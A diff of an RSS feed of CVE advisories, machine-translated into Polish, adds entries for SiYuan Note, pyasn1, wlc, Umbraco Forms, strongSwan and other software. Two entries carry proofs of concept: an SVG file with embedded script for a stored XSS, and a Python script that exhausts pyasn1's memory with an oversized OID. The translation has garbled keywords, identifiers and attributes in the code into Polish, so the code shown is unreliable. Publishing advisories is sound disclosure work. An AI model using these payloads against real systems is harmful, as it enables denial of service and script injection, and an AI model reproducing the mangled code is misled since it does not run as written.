@@ -1,5 +1,189 @@
 <?xml version='1.0' encoding='utf-8'?>
-<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2025-15032</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15032</link><pubDate>Fri, 16 Jan 2026 18:11:32 +0000</pubDate><description>Brak wskaźnika about:blank w nowych oknach Dia o niestandardowych rozmiarach przed wersją 1.9.0 na macOS może pozwolić osobie atakującej na sfałszowanie zaufanej domeny w tytule okna i wprowadzenie użytkowników w błąd co do bieżącej witryny.
+<rss version="2.0"><channel><title>CVE 2026 Feed</title><link>https://cve.circl.lu</link><description>CVE z roku 2026</description><item><title>CVE-2026-23645</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23645</link><pubDate>Fri, 16 Jan 2026 19:22:08 +0000</pubDate><description>### Podsumowanie
+W SiYuan Note występuje luka w zabezpieczeniach typu Stored Cross-Site Scripting (XSS).Aplikacja nie czyści przesłanych plików SVG.Jeśli użytkownik przesyła i przegląda złośliwy plik SVG (np. zaimportowany z niezaufanego źródła), w kontekście jego uwierzytelnionej sesji wykonywany jest dowolny kod JavaScript.
+
+### Szczegóły
+Aplikacja umożliwia uwierzytelnionym użytkownikom przesyłanie plików, w tym obrazów .svg, bez oczyszczania danych wejściowych w celu usunięcia osadzonego kodu JavaScript (takiego jak znaczniki &lt;script&gt; lub procedury obsługi zdarzeń).
+
+### PoC
+1. Utwórz nową „Notatkę codzienną” w obszarze roboczym.
+&lt;img szerokość="1287" wysokość="572" alt="image" src="https://github.com/user-attachments/assets/3a4389b9-695d-4e1b-94dc-72efdb047aa9" /&gt;
+2. Utwórz plik o nazwie test.svg zawierający złośliwy JavaScript w środku:
+
+```
+&lt;svg xmlns="http://www.w3.org/2000/svg" szerokość="200" wysokość="200" viewBox="0 0 124 124" fill="none"&gt;
+&lt;rect szerokość="124" wysokość="124" rx="24" fill="czerwony"/&gt;
+&lt;typ skryptu="text/javascript"&gt;
+alert(okno.pochodzenie);
+&lt;/skrypt&gt;
+&lt;/svg&gt;
+```
+3. Prześlij plik w aktualnej notatce dziennej:
+&lt;img szerokość="1617" wysokość="316" alt="image" src="https://github.com/user-attachments/assets/6e14318a-08ec-48e5-b278-9174ad17cfcb" /&gt;
+&lt;img szerokość="1482" wysokość="739" alt="image" src="https://github.com/user-attachments/assets/95c996e8-5591-436a-9467-ab56c9ffbde0" /&gt;
+&lt;img szerokość="1321" wysokość="548" alt="image" src="https://github.com/user-attachments/assets/249fb187-3caa-4372-a9c9-56dfda6b8a8f" /&gt;
+4. Otwórz plik:
+
+- Kliknij prawym przyciskiem myszy przesłany zasób w notatce.
+- Wybierz „Eksportuj”
+&lt;img szerokość="934" wysokość="718" alt="image" src="https://github.com/user-attachments/assets/ec943dfa-92ba-47f6-8b1e-56e53f1b0ca6" /&gt;
+5. Kod JavaScript jest wykonywany natychmiast.
+&lt;img szerokość="1033" wysokość="632" alt="image" src="https://github.com/user-attachments/assets/a1611291-d333-4f8e-9da9-62104aaa1bdd" /&gt;
+&lt;img szerokość="1381" wysokość="641" alt="image" src="https://github.com/user-attachments/assets/d5018203-dbd0-4285-8702-8cb3e7c5cd07" /&gt;
+
+### Wpływ
+Luka umożliwia przesłanie pliku SVG zawierającego szkodliwe skrypty.Kiedy użytkownik eksportuje ten plik, osadzony dowolny kod JavaScript jest wykonywany w kontekście jego przeglądarki
+
+### Notatki
+Testowana wersja:
+&lt;img szerokość="1440" wysokość="534" alt="image" src="https://github.com/user-attachments/assets/a62271e4-6850-4f59-be88-c4f8055429c0" /&gt;
+
+### Rozwiązanie
+
+https://github.com/siyuan-note/siyuan/issues/16844</description></item><item><title>CVE-2026-23645</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23645</link><pubDate>Fri, 16 Jan 2026 19:20:06 +0000</pubDate><description>SiYuan to oprogramowanie do zarządzania wiedzą osobistą typu open source, hostowane samodzielnie.W wersji starszej niż 3.5.4-dev2 w SiYuan Note występuje luka w zabezpieczeniach przechowywanych skryptów między witrynami (XSS).Aplikacja nie czyści przesłanych plików SVG.Jeśli użytkownik przesyła i przegląda złośliwy plik SVG (np. zaimportowany z niezaufanego źródła), w kontekście jego uwierzytelnionej sesji wykonywany jest dowolny kod JavaScript.Ta luka została naprawiona w wersji 3.5.4-dev2.</description></item><item><title>CVE-2026-23490</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23490</link><pubDate>Fri, 16 Jan 2026 19:19:25 +0000</pubDate><description>### Podsumowanie
+
+Po przejrzeniu pyasn1 v0.6.1 wykryto problem typu „odmowa usługi”, który prowadzi do wyczerpania pamięci z powodu zniekształconego RELATIVE-OID z nadmiernymi oktetami kontynuacji.
+
+### Szczegóły
+
+Problem z liczbą całkowitą można znaleźć w dekoderze jako `reloid += ((subId &lt;&lt; 7) + nextSubId,)`: https://github.com/pyasn1/pyasn1/blob/main/pyasn1/codec/ber/decoder.py#L496
+
+### PoC
+
+Dla DoSa:
+```py
+zaimportuj pyasn1.codec.ber.decoder jako dekoder
+importuj pyasn1.type.univ jako univ
+importuj sys
+importuj zasób
+
+# Celowo ustaw limit pamięci, aby wyświetlić PoC
+spróbuj:
+zasób.setrlimit(zasób.RLIMIT_AS, (100*1024*1024, 100*1024*1024))
+print("[*] Limit pamięci ustawiony na 100MB")
+z wyjątkiem:
+print("[-] Nie można ustawić limitu pamięci")
+
+# Przetestuj z różnymi rozmiarami ładunku, aby znaleźć próg DoS
+payload_size_mb = int(sys.argv[1])
+
+print(f"[*] Testowanie z ładunkiem {payload_size_mb}MB...")
+
+rozmiar_ładunek = rozmiar_ładunek_mb * 1024 * 1024
+# Utwórz ładunek z oktetami kontynuacji
+# Każdy bajt 0x81 oznacza kontynuację, powodując przesunięcie bitów w dekoderze
+ładunek = b'\x81' * rozmiar_ładowności + b'\x00'
+długość = długość (ładunek)
+
+# Kodowanie długości DER (obsługuje do 4 GB)
+jeśli długość &lt; 128:
+długość_bajtów = bajty([długość])
+długość elif &lt; 256:
+długość_bajtów = b'\x81' + długość.to_bytes(1, 'duży')
+długość elif &lt; 256**2:
+długość_bajtów = b'\x82' + długość.to_bytes(2, 'duży')
+długość elif &lt; 256**3:
+długość_bajtów = b'\x83' + długość.to_bytes(3, 'duży')
+inne:
+# 4 bajty mogą obsłużyć do 4 GB
+długość_bajtów = b'\x84' + długość.to_bytes(4, 'duży')
+
+# Użyj OID (0x06) dla bardziej agresywnego analizowania
+złośliwy_pakiet = b'\x06' + długość_bajtów + ładunek
+
+print(f"[*] Rozmiar pakietu: {len(malicious_packet) / 1024 / 1024:.1f} MB")
+
+spróbuj:
+print("[*] Dekodowanie (może to zająć trochę czasu lub wyczerpać pamięć)...")
+wynik = dekoder.decode(malicious_packet, asn1Spec=univ.ObjectIdentifier())
+
+print(f'[+] Dekodowano pomyślnie')
+print(f'[!] Rozmiar obiektu: {sys.getsizeof(result[0])} bajtów')
+
+# Spróbuj przekonwertować na ciąg
+print('[*] Konwersja na ciąg...')
+spróbuj:
+str_result = str(wynik[0])
+print(f'[+] Ciąg powiódł się: {len(str_result)} znaków')
+jeśli len(str_result) &gt; 10000:
+print(f'[!] WYBUCH PAMIĘCI: {len(str_result)} ciąg znaków!')
+z wyjątkiem błędu pamięci:
+print(f'[-] Błąd pamięci podczas konwersji ciągu!')
+z wyjątkiem wyjątku jako e:
+print(f'[-] {type(e).__name__} podczas konwersji ciągu')
+
+z wyjątkiem błędu pamięci:
+print('[-] Błąd pamięci: Brak pamięci!')
+z wyjątkiem wyjątku jako e:
+print(f'[-] Błąd: {type(e).__name__}: {e}')
+
+
+print("\n[*] Test zakończony")
+```
+
+
+Zrzuty ekranu z wynikami:
+
+#### DoS
+&lt;img szerokość="944" wysokość="207" alt="Screenshot_20251219_160840" src="https://github.com/user-attachments/assets/68b9566b-5ee1-47b0-a269-605b037dfc4f" /&gt;
+
+&lt;img szerokość="931" wysokość="231" alt="Screenshot_20251219_152815" src="https://github.com/user-attachments/assets/62eacf4f-eb31-4fba-b7a8-e8151484a9fa" /&gt;
+
+#### Analiza wycieków
+
+Zbadano potencjalny wyciek sterty, ale wszystko okazało się czyste:
+```
+[*] Tworzenie ładunku o rozmiarze 1000 KB...
+[*] Dekodowanie za pomocą pyasn1...
+[*] Materializacja do sznurka...
+[+] Zdekodowano 2157784 znaków
+[+] Reprezentacja binarna: 896001 bajtów
+[+] Zrzucony do heap_dump.bin
+
+[*] Pierwsze 64 bajty (szesnastkowo):
+01020408102040810204081020408102040810204081020408102040810204081020408102040810204081020408102040810204081020408102040810204081
+
+[*] Pierwsze 64 bajty (zrzut ASCII/szesnastkowy):
+0000: 01 02 04 08 10 20 40 81 02 04 08 10 20 40 81 02 ...... @..... @..
+0010: 04 08 10 20 40 81 02 04 08 10 20 40 81 02 04 08 ... @..... @....
+0020: 10 20 40 81 02 04 08 10 20 40 81 02 04 08 10 20 .@..... @.....
+0030: 40 81 02 04 08 10 20 40 81 02 04 08 10 20 40 81 @..... @..... @.
+
+[*] Analiza rozkładu cyfr:
+„0”: 10,1%
+„1”: 9,9%
+„2”: 10,0%
+„3”: 9,9%
+„4”: 9,9%
+„5”: 10,0%
+„6”: 10,0%
+„7”: 10,0%
+„8”: 9,9%
+„9”: 10,1%
+```
+
+### Scenariusz
+
+1. Osoba atakująca tworzy złośliwy certyfikat X.509.
+2. Aplikacja weryfikuje certyfikaty.
+3. Aplikacja akceptuje złośliwy certyfikat i próbuje zdekodować, co powoduje problemy wymienione powyżej.
+
+### Wpływ
+
+Ten problem może wpływać na zużycie zasobów i zawieszać systemy lub zatrzymywać usługi.
+Może to mieć wpływ na:
+- Serwery LDAP
+- Punkty końcowe TLS/SSL
+- Służby ratownicze OCSP
+- itp.
+
+### Zalecenie
+
+Dodaj limit dozwolonych bajtów w dekoderze.</description></item><item><title>CVE-2026-23535</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23535</link><pubDate>Fri, 16 Jan 2026 19:08:24 +0000</pubDate><description>wlc to klient wiersza poleceń Weblate korzystający z interfejsu API REST Weblate.Przed wersją 1.17.2 pobieranie z wieloma tłumaczeniami mogło zapisywać w dowolnej lokalizacji, jeśli zostało to poinstruowane przez spreparowany serwer.Ta luka została naprawiona w wersji 1.17.2.
+
+CVSS Score: 8.1 (high)</description></item><item><title>CVE-2026-23490</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23490</link><pubDate>Fri, 16 Jan 2026 19:03:36 +0000</pubDate><description>pyasn1 to ogólna biblioteka ASN.1 dla Pythona.Przed wersją 0.6.2 wykryto problem typu „odmowa usługi”, który prowadzi do wyczerpania pamięci z powodu zniekształconego RELATIVE-OID z nadmiernymi oktetami kontynuacji.Ta luka została naprawiona w wersji 0.6.2.
+
+CVSS Score: 7.5 (high)</description></item><item><title>CVE-2025-48647</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-48647</link><pubDate>Fri, 16 Jan 2026 18:19:02 +0000</pubDate><description>W cpm_fwtp_msg_handler pliku cpm/google/lib/tracepoint/cpm_fwtp_ipc.c istnieje możliwe nadpisanie pamięci z powodu nieprawidłowej weryfikacji danych wejściowych.Może to prowadzić do lokalnej eskalacji uprawnień bez konieczności posiadania dodatkowych uprawnień do wykonywania.Do wykorzystania nie jest wymagana interakcja użytkownika.</description></item><item><title>CVE-2025-15032</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-15032</link><pubDate>Fri, 16 Jan 2026 18:11:32 +0000</pubDate><description>Brak wskaźnika about:blank w nowych oknach Dia o niestandardowych rozmiarach przed wersją 1.9.0 na macOS może pozwolić osobie atakującej na sfałszowanie zaufanej domeny w tytule okna i wprowadzenie użytkowników w błąd co do bieżącej witryny.
 
 CVSS Score: 7.4 (high)</description></item><item><title>CVE-2026-0629</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-0629</link><pubDate>Fri, 16 Jan 2026 17:24:39 +0000</pubDate><description>Obejście uwierzytelniania w funkcji odzyskiwania hasła lokalnego interfejsu sieciowego w wielu modelach kamer VIGI umożliwia atakującemu w sieci LAN zresetowanie hasła administratora bez weryfikacji poprzez manipulację stanem po stronie klienta.Atakujący mogą uzyskać pełny dostęp administracyjny do urządzenia, narażając konfigurację i bezpieczeństwo sieci.</description></item><item><title>CVE-2025-31186</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-31186</link><pubDate>Fri, 16 Jan 2026 17:06:10 +0000</pubDate><description>Naprawiono problem z uprawnieniami, wprowadzając dodatkowe ograniczenia.Ten problem został rozwiązany w Xcode 16.3.Aplikacja może ominąć preferencje dotyczące prywatności.</description></item><item><title>CVE-2025-24090</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-24090</link><pubDate>Fri, 16 Jan 2026 17:06:09 +0000</pubDate><description>Naprawiono problem z uprawnieniami, wprowadzając dodatkowe ograniczenia.Ten problem został rozwiązany w iOS 18.3 i iPadOS 18.3.Aplikacja może być w stanie wyliczyć aplikacje zainstalowane przez użytkownika.</description></item><item><title>CVE-2025-43508</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-43508</link><pubDate>Fri, 16 Jan 2026 17:06:08 +0000</pubDate><description>Naprawiono problem z rejestrowaniem przez ulepszoną redakcję danych.Ten problem został rozwiązany w systemie macOS Tahoe 26.1.Aplikacja może mieć dostęp do wrażliwych danych użytkownika.</description></item><item><title>CVE-2024-44210</title><link>https://nvd.nist.gov/vuln/detail/CVE-2024-44210</link><pubDate>Fri, 16 Jan 2026 17:06:08 +0000</pubDate><description>Ten problem rozwiązano przez poprawienie sprawdzania uprawnień.Ten problem został rozwiązany w systemie macOS Sequoia 15.1.Aplikacja może mieć dostęp do danych wrażliwych użytkownika.</description></item><item><title>CVE-2025-24089</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-24089</link><pubDate>Fri, 16 Jan 2026 17:06:07 +0000</pubDate><description>Naprawiono problem z uprawnieniami, wprowadzając dodatkowe ograniczenia.Ten problem został rozwiązany w iOS 18.3 i iPadOS 18.3.Aplikacja może być w stanie wyliczyć aplikacje zainstalowane przez użytkownika.</description></item><item><title>CVE-2024-54556</title><link>https://nvd.nist.gov/vuln/detail/CVE-2024-54556</link><pubDate>Fri, 16 Jan 2026 17:06:06 +0000</pubDate><description>Ten problem naprawiono przez poprawienie zarządzania stanem.Ten problem został rozwiązany w iOS 18.1 i iPadOS 18.1.Użytkownik może mieć możliwość przeglądania treści objętych ograniczeniami na ekranie blokady.</description></item><item><title>CVE-2024-44238</title><link>https://nvd.nist.gov/vuln/detail/CVE-2024-44238</link><pubDate>Fri, 16 Jan 2026 17:06:05 +0000</pubDate><description>Ten problem naprawiono przez poprawienie sprawdzania granic.Ten problem został rozwiązany w iOS 18.1 i iPadOS 18.1.Aplikacja może uszkodzić pamięć koprocesora.</description></item><item><title>CVE-2026-23529</title><link>https://nvd.nist.gov/vuln/detail/CVE-2026-23529</link><pubDate>Fri, 16 Jan 2026 16:53:17 +0000</pubDate><description>Kafka Connect BigQuery Connector to implementacja łącznika ujścia z Apache Kafka do Google BigQuery.Przed wersją 2.11.0 w łączniku Google BigQuery Sink odczytywany jest dowolny plik.Łącznik Google BigQuery Kafka Connect Sink firmy Aiven wymaga konfiguracji danych logowania Google Cloud do uwierzytelniania w usługach BigQuery.Podczas konfigurowania oprogramowania sprzęgającego użytkownicy mogą dostarczać pliki JSON z danymi uwierzytelniającymi, które są przetwarzane przez biblioteki uwierzytelniające Google.Usługa nie sprawdza poprawności konfiguracji poświadczeń pochodzących z zewnętrznych źródeł przed przekazaniem ich do bibliotek uwierzytelniających.Osoba atakująca może to wykorzystać, dostarczając złośliwą konfigurację poświadczeń zawierającą spreparowane ścieżki pliku credential_source.file lub punkty końcowe credential_source.url, co skutkuje arbitralnymi odczytami plików lub atakami SSRF.
 
@@ -147,7 +331,11 @@ CVSS Score: 7.2 (high)</description></item><item><title>CVE-2025-24531</title><l
 
 CVSS Score: 6.7 (medium)</description></item><item><title>CVE-2025-24528</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-24528</link><pubDate>Fri, 16 Jan 2026 00:00:00 +0000</pubDate><description>W MIT Kerberos 5 (aka krb5) przed wersją 1.22 (z propagacją przyrostową) występuje przepełnienie liczb całkowitych w przypadku dużego rozmiaru aktualizacji w celu resize() w kdb_log.c.Uwierzytelniony atakujący może spowodować przekroczenie dopuszczalnego zapisu i awarię demona kadmind.
 
-CVSS Score: 7.1 (high)</description></item><item><title>CVE-2025-61873</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-61873</link><pubDate>Fri, 16 Jan 2026 00:00:00 +0000</pubDate><description>Best Practical Request Tracker (RT) przed wersjami 4.4.9, 5.0.9 i 6.0.2 umożliwia wstrzykiwanie CSV poprzez wartości biletów, gdy używany jest eksport TSV.</description></item><item><title>CVE-2025-14237</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14237</link><pubDate>Thu, 15 Jan 2026 23:40:35 +0000</pubDate><description>Przepełnienie bufora podczas przetwarzania analizy czcionek XPS w wielofunkcyjnych drukarkach i drukarkach laserowych dla małych biur(*), co może umożliwić osobie atakującej w segmencie sieci spowodowanie, że produkt, którego dotyczy problem, przestanie odpowiadać lub wykona dowolny kod.*: Oprogramowanie sprzętowe Satera LBP670C Series/Satera MF750C Series v06.02 i wcześniejsze sprzedawane w Japonii.Color imageCLASS LBP630C/Color imageCLASS MF650C Series/imageCLASS LBP230 Series/imageCLASS X LBP1238 II/imageCLASS MF450 Series/imageCLASS X MF1238 II/imageCLASS XOprogramowanie sprzętowe MF1643i II/imageCLASS X MF1643iF II w wersji 06.02 i wcześniejsze sprzedawane w USA. Seria i-SENSYS LBP630C/seria i-SENSYS MF650C/seria i-SENSYS LBP230/1238P II/1238Pr II/seria i-SENSYS MF450/seria i-SENSYS MF550Oprogramowanie układowe Series/1238i II/1238iF II/imageRUNNER 1643i II/imageRUNNER 1643iF II w wersji 06.02 i wcześniejsze sprzedawane w Europie.
+CVSS Score: 7.1 (high)</description></item><item><title>CVE-2025-61873</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-61873</link><pubDate>Fri, 16 Jan 2026 00:00:00 +0000</pubDate><description>Best Practical Request Tracker (RT) przed wersjami 4.4.9, 5.0.9 i 6.0.2 umożliwia wstrzykiwanie CSV poprzez wartości biletów, gdy używany jest eksport TSV.</description></item><item><title>CVE-2025-68924</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-68924</link><pubDate>Fri, 16 Jan 2026 00:00:00 +0000</pubDate><description>W Umbraco UmbracoForms do wersji 8.13.16 uwierzytelniona osoba atakująca może dostarczyć złośliwy adres URL WSDL (inaczej usługi internetowej) jako źródło danych do zdalnego wykonania kodu.
+
+CVSS Score: 7.5 (high)</description></item><item><title>CVE-2025-62291</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-62291</link><pubDate>Fri, 16 Jan 2026 00:00:00 +0000</pubDate><description>We wtyczce eap-mschapv2 (po stronie klienta) w strongSwan przed wersją 6.0.3 złośliwy serwer EAP-MSCHAPv2 może wysłać spreparowany komunikat o rozmiarze od 6 do 8 i spowodować niedopełnienie liczby całkowitej, co potencjalnie może skutkować przepełnieniem buforu sterty.
+
+CVSS Score: 8.1 (high)</description></item><item><title>CVE-2025-14237</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14237</link><pubDate>Thu, 15 Jan 2026 23:40:35 +0000</pubDate><description>Przepełnienie bufora podczas przetwarzania analizy czcionek XPS w wielofunkcyjnych drukarkach i drukarkach laserowych dla małych biur(*), co może umożliwić osobie atakującej w segmencie sieci spowodowanie, że produkt, którego dotyczy problem, przestanie odpowiadać lub wykona dowolny kod.*: Oprogramowanie sprzętowe Satera LBP670C Series/Satera MF750C Series v06.02 i wcześniejsze sprzedawane w Japonii.Color imageCLASS LBP630C/Color imageCLASS MF650C Series/imageCLASS LBP230 Series/imageCLASS X LBP1238 II/imageCLASS MF450 Series/imageCLASS X MF1238 II/imageCLASS XOprogramowanie sprzętowe MF1643i II/imageCLASS X MF1643iF II w wersji 06.02 i wcześniejsze sprzedawane w USA. Seria i-SENSYS LBP630C/seria i-SENSYS MF650C/seria i-SENSYS LBP230/1238P II/1238Pr II/seria i-SENSYS MF450/seria i-SENSYS MF550Oprogramowanie układowe Series/1238i II/1238iF II/imageRUNNER 1643i II/imageRUNNER 1643iF II w wersji 06.02 i wcześniejsze sprzedawane w Europie.
 
 CVSS Score: 9.8 (critical)</description></item><item><title>CVE-2025-14236</title><link>https://nvd.nist.gov/vuln/detail/CVE-2025-14236</link><pubDate>Thu, 15 Jan 2026 23:39:50 +0000</pubDate><description>Przepełnienie bufora podczas przetwarzania znaczników atrybutów książki adresowej w wielofunkcyjnych drukarkach do małych biur(*), co może umożliwić osobie atakującej w segmencie sieci spowodowanie, że produkt, którego dotyczy problem, przestanie odpowiadać lub wykona dowolny kod.*: Oprogramowanie sprzętowe Satera LBP670C Series/Satera MF750C Series v06.02 i wcześniejsze sprzedawane w Japonii.Color imageCLASS LBP630C/Color imageCLASS MF650C Series/imageCLASS LBP230 Series/imageCLASS X LBP1238 II/imageCLASS MF450 Series/imageCLASS X MF1238 II/imageCLASS XOprogramowanie sprzętowe MF1643i II/imageCLASS X MF1643iF II w wersji 06.02 i wcześniejsze sprzedawane w USA. Seria i-SENSYS LBP630C/seria i-SENSYS MF650C/seria i-SENSYS LBP230/1238P II/1238Pr II/seria i-SENSYS MF450/seria i-SENSYS MF550Oprogramowanie układowe Series/1238i II/1238iF II/imageRUNNER 1643i II/imageRUNNER 1643iF II w wersji 06.02 i wcześniejsze sprzedawane w Europie.
 
